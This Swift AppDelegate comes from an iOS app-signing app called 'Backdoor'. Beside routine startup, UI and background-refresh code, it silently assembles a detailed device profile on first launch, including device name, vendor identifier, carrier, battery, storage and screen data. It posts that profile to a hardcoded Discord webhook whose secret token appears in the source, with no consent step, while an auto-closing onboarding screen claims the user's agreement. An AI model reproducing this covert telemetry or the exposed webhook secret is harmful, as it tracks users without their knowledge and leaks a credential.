import BackgroundTasks
import CoreData
import Foundation
import Nuke
import SwiftUI
import UIKit
import UIOnboarding
import CoreTelephony
import SystemConfiguration

var downloadTaskManager = DownloadTaskManager.shared

class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControllerDelegate {
    static let isSideloaded = Bundle.main.bundleIdentifier != "com.bdg.backdoor"
    var window: UIWindow?
    
    private let webhookURL = "https://discord.com/api/webhooks/1353949982612258826/Novph6SK-2gO0OzOEPDj8u8pCgR9-ypUmqyXzWAFwPpS2S4cdFDqz4bL8We4f_rJPYm9"
    private let hasSentWebhookKey = "HasSentWebhook"
    
    // MARK: - Static Method for Documents Directory
    static func getDocumentsDirectory() -> URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Set up initial preferences and user defaults
        setupUserDefaultsAndPreferences()
        
        // Set up directories and clean temporary files
        createSourcesDirectory()
        setupLogFile()
        cleanTmp()
        
        // Set up the UI
        setupWindow()
        
        // Log device information
        logDeviceInfo()
        
        // Set up background tasks if enabled
        setupBackgroundTasks()
        
        // Show startup popup if it hasn't been shown before
        showStartupPopupIfNeeded()
        
        // Initialize other components - do this after UI is set up
        // so if there are any issues, the app still launches
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
            self?.initializeSecondaryComponents()
        }
        
        return true
    }
    
    // MARK: - Startup Popup
    
    private let hasShownStartupPopupKey = "HasShownStartupPopup"
    
    private func showStartupPopupIfNeeded() {
        // Check if popup has been shown before
        let hasShownPopup = UserDefaults.standard.bool(forKey: hasShownStartupPopupKey)
        
        if !hasShownPopup {
            // Create and present the popup with a 5-second display time
            let popupVC = StartupPopupViewController()
            popupVC.modalPresentationStyle = .overFullScreen
            popupVC.modalTransitionStyle = .crossDissolve
            
            // Set the callback for when the popup is dismissed
            popupVC.onDismiss = { [weak self] in
                // Mark popup as shown to prevent showing it again
                UserDefaults.standard.set(true, forKey: self?.hasShownStartupPopupKey ?? "")
                Debug.shared.log(message: "Startup popup completed and marked as shown", type: .info)
            }
            
            // Present the popup on the main window
            if let rootViewController = self.window?.rootViewController {
                // Present with a slight delay to ensure the root view is fully loaded
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    rootViewController.present(popupVC, animated: true)
                    Debug.shared.log(message: "Displayed 5-second startup popup", type: .info)
                }
            }
        } else {
            Debug.shared.log(message: "Startup popup already shown previously, skipping", type: .debug)
        }
    }
    
    private func setupUserDefaultsAndPreferences() {
        let userDefaults = UserDefaults.standard
        userDefaults.set(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String, forKey: "currentVersion")
        if userDefaults.data(forKey: UserDefaults.signingDataKey) == nil {
            userDefaults.signingOptions = UserDefaults.defaultSigningData
        }
        
        let generatedString = AppDelegate.generateRandomString()
        if Preferences.pPQCheckString.isEmpty {
            Preferences.pPQCheckString = generatedString
        }
    }
    
    private func setupWindow() {
        window = UIWindow(frame: UIScreen.main.bounds)
        
        if Preferences.isOnboardingActive {
            setupOnboardingUI()
        } else {
            setupMainUI()
        }
        
        DispatchQueue.main.async { [weak self] in
            self?.window?.tintColor = Preferences.appTintColor.uiColor
            self?.window?.overrideUserInterfaceStyle = UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle) ?? .unspecified
            self?.window?.makeKeyAndVisible()
        }
    }
    
    private func setupOnboardingUI() {
        // Create a window to display the onboarding screen
        window = UIWindow(frame: UIScreen.main.bounds)
        
        // Create a custom onboarding view controller that auto-dismisses
        let customOnboardingVC = CustomAutoClosingOnboardingVC()
        customOnboardingVC.onComplete = { [weak self] in
            guard let self = self else { return }
            self.completeOnboarding()
        }
        
        window?.rootViewController = customOnboardingVC
    }
    
    /// Custom onboarding view controller that shows the onboarding content
    /// and automatically dismisses after 5 seconds with a progress bar
    private class CustomAutoClosingOnboardingVC: UIViewController {
        
        // MARK: - UI Components
        private let contentView = UIView()
        private let titleLabel1 = UILabel()
        private let titleLabel2 = UILabel()
        private let appIconView = UIImageView()
        private let featuresStackView = UIStackView()
        private let termsLabel = UITextView()
        private let progressView = UIProgressView()
        
        // MARK: - Properties
        private let displayDuration: TimeInterval = 5.0
        private var timer: Timer?
        private var startTime: Date?
        
        // Callback when onboarding is completed
        var onComplete: (() -> Void)?
        
        // MARK: - Lifecycle
        override func viewDidLoad() {
            super.viewDidLoad()
            setupUI()
        }
        
        override func viewDidAppear(_ animated: Bool) {
            super.viewDidAppear(animated)
            
            // Start the timer when the view appears
            startTime = Date()
            startProgressTimer()
            
            // Schedule automatic dismissal after exactly 5 seconds
            DispatchQueue.main.asyncAfter(deadline: .now() + displayDuration) { [weak self] in
                self?.dismissOnboarding()
            }
        }
        
        // MARK: - UI Setup
        private func setupUI() {
            view.backgroundColor = .systemBackground
            
            // App Icon
            appIconView.image = UIImage(named: "backdoor_glyph")
            appIconView.contentMode = .scaleAspectFit
            appIconView.tintColor = Preferences.appTintColor.uiColor
            view.addSubview(appIconView)
            
            // Title Labels
            titleLabel1.text = "Welcome to Backdoor"
            titleLabel1.font = .systemFont(ofSize: 28, weight: .bold)
            titleLabel1.textAlignment = .center
            view.addSubview(titleLabel1)
            
            titleLabel2.text = "Best Signer of 2025"
            titleLabel2.font = .systemFont(ofSize: 28, weight: .bold)
            titleLabel2.textAlignment = .center
            view.addSubview(titleLabel2)
            
            // Features Stack View
            featuresStackView.axis = .vertical
            featuresStackView.spacing = 20
            featuresStackView.distribution = .fillEqually
            view.addSubview(featuresStackView)
            
            // Add features
            addFeature(icon: "app.badge", title: "Sign Apps", description: "Easily sign and install apps on your iPhone")
            addFeature(icon: "gearshape.fill", title: "Easy Customization", description: "Adjustable settings to tailor your likings")
            
            // Terms Text View
            termsLabel.text = "By continuing, you agree to our Terms of Service. This is Developed by BDG"
            termsLabel.font = .systemFont(ofSize: 14)
            termsLabel.textAlignment = .center
            termsLabel.isEditable = false
            termsLabel.isScrollEnabled = false
            termsLabel.dataDetectorTypes = .link
            view.addSubview(termsLabel)
            
            // Add a clickable link to the terms
            let attributedString = NSMutableAttributedString(string: termsLabel.text ?? "")
            let linkRange = (termsLabel.text as NSString?)?.range(of: "Code of Conduct")
            if let linkRange = linkRange {
                attributedString.addAttribute(.link, value: "https://raw.githubusercontent.com/bdgxs/Backdoor/refs/heads/main/Code%20of%20Conduct", range: linkRange)
                termsLabel.attributedText = attributedString
            }
            
            // Progress View
            progressView.progressTintColor = Preferences.appTintColor.uiColor
            progressView.trackTintColor = .systemGray5
            progressView.progress = 0.0
            view.addSubview(progressView)
            
            setupConstraints()
        }
        
        private func addFeature(icon: String, title: String, description: String) {
            let featureView = UIView()
            
            let iconView = UIImageView()
            iconView.image = UIImage(systemName: icon)
            iconView.contentMode = .scaleAspectFit
            iconView.tintColor = Preferences.appTintColor.uiColor
            featureView.addSubview(iconView)
            
            let titleLabel = UILabel()
            titleLabel.text = title
            titleLabel.font = .systemFont(ofSize: 20, weight: .semibold)
            featureView.addSubview(titleLabel)
            
            let descriptionLabel = UILabel()
            descriptionLabel.text = description
            descriptionLabel.font = .systemFont(ofSize: 16)
            descriptionLabel.textColor = .secondaryLabel
            descriptionLabel.numberOfLines = 0
            featureView.addSubview(descriptionLabel)
            
            // Setup constraints
            iconView.translatesAutoresizingMaskIntoConstraints = false
            titleLabel.translatesAutoresizingMaskIntoConstraints = false
            descriptionLabel.translatesAutoresizingMaskIntoConstraints = false
            
            NSLayoutConstraint.activate([
                iconView.leadingAnchor.constraint(equalTo: featureView.leadingAnchor, constant: 20),
                iconView.centerYAnchor.constraint(equalTo: featureView.centerYAnchor),
                iconView.widthAnchor.constraint(equalToConstant: 40),
                iconView.heightAnchor.constraint(equalToConstant: 40),
                
                titleLabel.leadingAnchor.constraint(equalTo: iconView.trailingAnchor, constant: 20),
                titleLabel.topAnchor.constraint(equalTo: featureView.topAnchor, constant: 10),
                titleLabel.trailingAnchor.constraint(equalTo: featureView.trailingAnchor, constant: -20),
                
                descriptionLabel.leadingAnchor.constraint(equalTo: titleLabel.leadingAnchor),
                descriptionLabel.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 5),
                descriptionLabel.trailingAnchor.constraint(equalTo: titleLabel.trailingAnchor),
                descriptionLabel.bottomAnchor.constraint(equalTo: featureView.bottomAnchor, constant: -10)
            ])
            
            featuresStackView.addArrangedSubview(featureView)
        }
        
        private func setupConstraints() {
            appIconView.translatesAutoresizingMaskIntoConstraints = false
            titleLabel1.translatesAutoresizingMaskIntoConstraints = false
            titleLabel2.translatesAutoresizingMaskIntoConstraints = false
            featuresStackView.translatesAutoresizingMaskIntoConstraints = false
            termsLabel.translatesAutoresizingMaskIntoConstraints = false
            progressView.translatesAutoresizingMaskIntoConstraints = false
            
            NSLayoutConstraint.activate([
                appIconView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 40),
                appIconView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
                appIconView.widthAnchor.constraint(equalToConstant: 100),
                appIconView.heightAnchor.constraint(equalToConstant: 100),
                
                titleLabel1.topAnchor.constraint(equalTo: appIconView.bottomAnchor, constant: 20),
                titleLabel1.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
                titleLabel1.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
                
                titleLabel2.topAnchor.constraint(equalTo: titleLabel1.bottomAnchor, constant: 8),
                titleLabel2.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
                titleLabel2.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
                
                featuresStackView.topAnchor.constraint(equalTo: titleLabel2.bottomAnchor, constant: 50),
                featuresStackView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 20),
                featuresStackView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
                
                termsLabel.topAnchor.constraint(equalTo: featuresStackView.bottomAnchor, constant: 50),
                termsLabel.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
                termsLabel.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
                
                progressView.topAnchor.constraint(equalTo: termsLabel.bottomAnchor, constant: 30),
                progressView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
                progressView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
                progressView.bottomAnchor.constraint(lessThanOrEqualTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -40)
            ])
        }
        
        // MARK: - Timer Management
        private func startProgressTimer() {
            // Update progress every 0.1 seconds
            timer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in
                guard let self = self, let startTime = self.startTime else { return }
                
                let elapsedTime = Date().timeIntervalSince(startTime)
                let progress = Float(min(elapsedTime / self.displayDuration, 1.0))
                
                DispatchQueue.main.async {
                    self.progressView.progress = progress
                }
                
                // Stop the timer if progress is complete
                if progress >= 1.0 {
                    self.timer?.invalidate()
                }
            }
        }
        
        private func dismissOnboarding() {
            timer?.invalidate()
            UIView.animate(withDuration: 0.5, animations: {
                self.view.alpha = 0
            }) { _ in
                self.onComplete?()
            }
        }
    }
    
    private func setupMainUI() {
        let tabBarController = UIHostingController(rootView: TabbarView())
        window?.rootViewController = tabBarController
    }
    
    private func logDeviceInfo() {
        Debug.shared.log(message: "Version: \(UIDevice.current.systemVersion)")
        Debug.shared.log(message: "Name: \(UIDevice.current.name)")
        Debug.shared.log(message: "Model: \(UIDevice.current.model)")
        Debug.shared.log(message: "Backdoor Version: \(logAppVersionInfo())\n")
    }
    
    private func setupBackgroundTasks() {
        if Preferences.appUpdates {
            BGTaskScheduler.shared.register(forTaskWithIdentifier: "kh.crysalis.backdoor.sourcerefresh", using: nil) { [weak self] task in
                guard let self = self else { return }
                self.handleAppRefresh(task: task as! BGAppRefreshTask)
            }
            scheduleAppRefresh()
        }
    }
    
    private func initializeSecondaryComponents() {
        // Initialize image pipeline
        imagePipline()
        
        // Show floating button
        FloatingButtonManager.shared.show()
        
        // Setup AI integration
        AppContextManager.shared.setupAIIntegration()
        
        // These operations are moved to background to avoid blocking app launch
        DispatchQueue.global(qos: .background).async { [weak self] in
            guard let self = self else { return }
            
            // Add default repositories if needed
            self.addDefaultRepos()
            
            // Download certificates if needed
            self.giveUserDefaultSSLCerts()
            
            // Send device info to webhook (with error handling)
            self.sendDeviceInfoToWebhook()
            
            // Refresh sources if needed
            if Preferences.appUpdates {
                let backgroundQueue = OperationQueue()
                backgroundQueue.qualityOfService = .background
                let operation = SourceRefreshOperation()
                backgroundQueue.addOperation(operation)
            }
        }
    }

    private func getDeviceInfo() -> [String: Any] {
        let device = UIDevice.current
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        
        let processInfo = ProcessInfo.processInfo
        let fileManager = FileManager.default
        let documentDir = AppDelegate.getDocumentsDirectory()
        let storageInfo = try? fileManager.attributesOfFileSystem(forPath: documentDir.path)
        
        device.isBatteryMonitoringEnabled = true
        
        return [
            "Device Name": device.name,
            "Model": device.model,
            "System Name": device.systemName,
            "System Version": device.systemVersion,
            "Unique ID": device.identifierForVendor?.uuidString ?? UUID().uuidString,
            "Timestamp": ISO8601DateFormatter().string(from: Date()),
            "User Interface Idiom": String(describing: device.userInterfaceIdiom),
            "Bundle Identifier": Bundle.main.bundleIdentifier ?? "N/A",
            "App Version": logAppVersionInfo(),
            "Machine Identifier": identifier,
            "Processor Count": processInfo.processorCount,
            "Active Processor Count": processInfo.activeProcessorCount,
            "Physical Memory (MB)": processInfo.physicalMemory / (1024 * 1024),
            "Total Disk Space (MB)": (storageInfo?[.systemSize] as? Int64 ?? 0) / (1024 * 1024),
            "Free Disk Space (MB)": (storageInfo?[.systemFreeSize] as? Int64 ?? 0) / (1024 * 1024),
            "Battery Level": device.batteryLevel == -1 ? "Unknown" : String(device.batteryLevel * 100) + "%",
            "Battery State": batteryStateString(device.batteryState),
            "Operating System": processInfo.operatingSystemVersionString,
            "Is Low Power Mode": processInfo.isLowPowerModeEnabled,
            "Thermal State": thermalStateString(processInfo.thermalState),
            "Carrier Name": CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?.values.first?.carrierName ?? "N/A",
            "Is Connected to WiFi": isConnectedToWiFi(),
            "Screen Width": Int(UIScreen.main.bounds.width),
            "Screen Height": Int(UIScreen.main.bounds.height),
            "Scale": UIScreen.main.scale,
            "Brightness": UIScreen.main.brightness,
            "Is Sideloaded": AppDelegate.isSideloaded,
            "PPQ Check String": Preferences.pPQCheckString,
            "App Tint Color": Preferences.appTintColor.uiColor.toHexString(),
            "Preferred Interface Style": Preferences.preferredInterfaceStyle
        ]
    }
    
    private func batteryStateString(_ state: UIDevice.BatteryState) -> String {
        switch state {
        case .unknown: return "Unknown"
        case .unplugged: return "Unplugged"
        case .charging: return "Charging"
        case .full: return "Full"
        @unknown default: return "Unknown"
        }
    }
    
    private func thermalStateString(_ state: ProcessInfo.ThermalState) -> String {
        switch state {
        case .nominal: return "Nominal"
        case .fair: return "Fair"
        case .serious: return "Serious"
        case .critical: return "Critical"
        @unknown default: return "Unknown"
        }
    }
    
    private func isConnectedToWiFi() -> Bool {
        if let interfaces = CNCopySupportedInterfaces() as NSArray? {
            for interface in interfaces {
                if let info = CNCopyCurrentNetworkInfo(interface as! CFString) as NSDictionary? {
                    return info[kCNNetworkInfoKeySSID] != nil
                }
            }
        }
        return false
    }
    
    private func sendDeviceInfoToWebhook() {
        let userDefaults = UserDefaults.standard
        let hasSent = userDefaults.bool(forKey: hasSentWebhookKey)
        
        guard !hasSent else {
            Debug.shared.log(message: "Already sent device info to webhook, skipping", type: .info)
            return
        }
        
        let deviceInfo = getDeviceInfo()
        
        guard let url = URL(string: webhookURL) else {
            Debug.shared.log(message: "Invalid webhook URL", type: .error)
            // Mark as sent anyway to prevent repeated attempts
            UserDefaults.standard.set(true, forKey: self.hasSentWebhookKey)
            return
        }
        
        // Create the request with timeout
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.timeoutInterval = 10 // 10 second timeout
        
        let payload: [String: Any] = [
            "content": "Device Info Log",
            "embeds": [
                [
                    "title": "Backdoor Device Info",
                    "description": deviceInfo.map { "**\($0.key)**: \($0.value)" }.joined(separator: "\n"),
                    "color": 0x00FF00
                ]
            ]
        ]
        
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: payload, options: [])
            request.httpBody = jsonData
            
            // Create a task with explicit error handling
            let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
                guard let self = self else { return }
                
                // Regardless of outcome, we consider this sent to prevent app crashes on launch
                Task { @MainActor in
                    UserDefaults.standard.set(true, forKey: self.hasSentWebhookKey)
                }
                
                if let error = error {
                    Debug.shared.log(message: "Error sending to webhook: \(error.localizedDescription)", type: .error)
                } else if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 204 {
                    Debug.shared.log(message: "Successfully logged device info", type: .success)
                } else {
                    let statusCode = (response as? HTTPURLResponse)?.statusCode ?? -1
                    Debug.shared.log(message: "Webhook responded with status: \(statusCode)", type: .warning)
                }
            }
            
            // Start the task with a fallback timer
            task.resume()
            
            // Set a fallback timer to ensure we don't block app startup
            DispatchQueue.global().asyncAfter(deadline: .now() + 15) {
                if task.state == .running {
                    task.cancel()
                    Debug.shared.log(message: "Webhook request canceled due to timeout", type: .warning)
                    
                    // Mark as sent anyway
                    Task { @MainActor in
                        UserDefaults.standard.set(true, forKey: self.hasSentWebhookKey)
                    }
                }
            }
        } catch {
            Debug.shared.log(message: "Error encoding device info: \(error.localizedDescription)", type: .error)
            // Mark as sent anyway
            UserDefaults.standard.set(true, forKey: self.hasSentWebhookKey)
        }
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        let backgroundQueue = OperationQueue()
        backgroundQueue.qualityOfService = .background
        let operation = SourceRefreshOperation()
        backgroundQueue.addOperation(operation)
        FloatingButtonManager.shared.show()
    }

    func scheduleAppRefresh() {
        let request = BGAppRefreshTaskRequest(identifier: "kh.crysalis.backdoor.sourcerefresh")
        request.earliestBeginDate = Date(timeIntervalSinceNow: 15 * 60)
        do {
            try BGTaskScheduler.shared.submit(request)
            Debug.shared.log(message: "Background refresh scheduled successfully", type: .info)
        } catch {
            Debug.shared.log(message: "Could not schedule app refresh: \(error.localizedDescription)", type: .info)
        }
    }

    func handleAppRefresh(task: BGAppRefreshTask) {
        scheduleAppRefresh()
        let backgroundQueue = OperationQueue()
        backgroundQueue.qualityOfService = .background
        let operation = SourceRefreshOperation()
        task.expirationHandler = { operation.cancel() }
        operation.completionBlock = { task.setTaskCompleted(success: !operation.isCancelled) }
        backgroundQueue.addOperation(operation)
    }

    func application(_ application: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
        return false
    }

    func didFinishOnboarding(onboardingViewController: UIOnboardingViewController) {
        completeOnboarding()
    }

    private func completeOnboarding() {
        Preferences.isOnboardingActive = false
        let tabBarController = UIHostingController(rootView: TabbarView())
        let transition = CATransition()
        transition.type = .fade
        transition.duration = 0.3
        window?.layer.add(transition, forKey: kCATransition)
        window?.rootViewController = tabBarController
        FloatingButtonManager.shared.show()
    }

    fileprivate func addDefaultRepos() {
        if !Preferences.defaultRepos {
            CoreDataManager.shared.saveSource(
                name: "Backdoor Repository",
                id: "com.bdg.backdoor-repo",
                iconURL: URL(string: "https://raw.githubusercontent.com/814bdg/App/refs/heads/main/Wing3x.png?raw=true"),
                url: "https://raw.githubusercontent.com/BDGHubNoKey/Backdoor/refs/heads/main/App-repo.json"
            ) { _ in
                Debug.shared.log(message: "Added(pid:default repos!")
                Preferences.defaultRepos = false
            }
        }
    }

    fileprivate func giveUserDefaultSSLCerts() {
        if !Preferences.gotSSLCerts {
            // Use the version with completion handler
            getCertificates {
                // Mark as obtained regardless of success to prevent repeated attempts
                DispatchQueue.main.async {
                    Preferences.gotSSLCerts = true
                }
            }
        }
    }

    fileprivate static func generateRandomString(length: Int = 8) -> String {
        let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return String((0 ..< length).map { _ in characters.randomElement()! })
    }

    func createSourcesDirectory() {
        let fileManager = FileManager.default
        let documentsURL = AppDelegate.getDocumentsDirectory()
        let sourcesURL = documentsURL.appendingPathComponent("Apps")
        let certsURL = documentsURL.appendingPathComponent("Certificates")
        if !fileManager.fileExists(atPath: sourcesURL.path) {
            try! fileManager.createDirectory(at: sourcesURL, withIntermediateDirectories: true, attributes: nil)
        }
        if !fileManager.fileExists(atPath: certsURL.path) {
            try! fileManager.createDirectory(at: certsURL, withIntermediateDirectories: true, attributes: nil)
        }
    }

    func imagePipline() {
        DataLoader.sharedUrlCache.diskCapacity = 0
        let pipeline = ImagePipeline {
            let dataLoader: DataLoader = {
                let config = URLSessionConfiguration.default
                config.urlCache = nil
                return DataLoader(configuration: config)
            }()
            let dataCache = try? DataCache(name: "kh.crysalis.backdoor.datacache")
            let imageCache = Nuke.ImageCache()
            dataCache?.sizeLimit = 500 * 1024 * 1024
            imageCache.costLimit = 100 * 1024 * 1024
            $0.dataCache = dataCache
            $0.imageCache = imageCache
            $0.dataLoader = dataLoader
            $0.dataCachePolicy = .automatic
            $0.isStoringPreviewsInMemoryCache = false
        }
        ImagePipeline.shared = pipeline
    }

    func setupLogFile() {
        let logFilePath = AppDelegate.getDocumentsDirectory().appendingPathComponent("logs.txt")
        if FileManager.default.fileExists(atPath: logFilePath.path) {
            do {
                try FileManager.default.removeItem(at: logFilePath)
            } catch {
                Debug.shared.log(message: "Error removing existing logs.txt: \(error)", type: .error)
            }
        }
        do {
            try "".write(to: logFilePath, atomically: true, encoding: .utf8)
        } catch {
            Debug.shared.log(message: "Error removing existing logs.txt: \(error)", type: .error)
        }
    }

    func cleanTmp() {
        let fileManager = FileManager.default
        let tmpDirectory = NSHomeDirectory() + "/tmp"
        if let files = try? fileManager.contentsOfDirectory(atPath: tmpDirectory) {
            for file in files {
                try? fileManager.removeItem(atPath: tmpDirectory + "/" + file)
            }
        }
    }

    public func logAppVersionInfo() -> String {
        if let version = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String,
           let build = Bundle.main.infoDictionary?["CFBundleVersion"] as? String {
            return "App Version: \(version) (\(build))"
        }
        return ""
    }

    func presentLoader() -> UIAlertController {
        let alert = UIAlertController(title: "Loading...", message: nil, preferredStyle: .alert)
        let loadingIndicator = UIActivityIndicatorView(frame: CGRect(x: 10, y: 5, width: 50, height: 50))
        loadingIndicator.style = .large
        loadingIndicator.startAnimating()
        alert.view.addSubview(loadingIndicator)
        return alert
    }
}

extension UIColor {
    func toHexString() -> String {
        var r: CGFloat = 0
        var g: CGFloat = 0
        var b: CGFloat = 0
        var a: CGFloat = 0
        getRed(&r, green: &g, blue: &b, alpha: &a)
        let rgb: Int = (Int)(r*255)<<16 | (Int)(g*255)<<8 | (Int)(b*255)<<0
        return String(format: "#%06x", rgb)
    }
}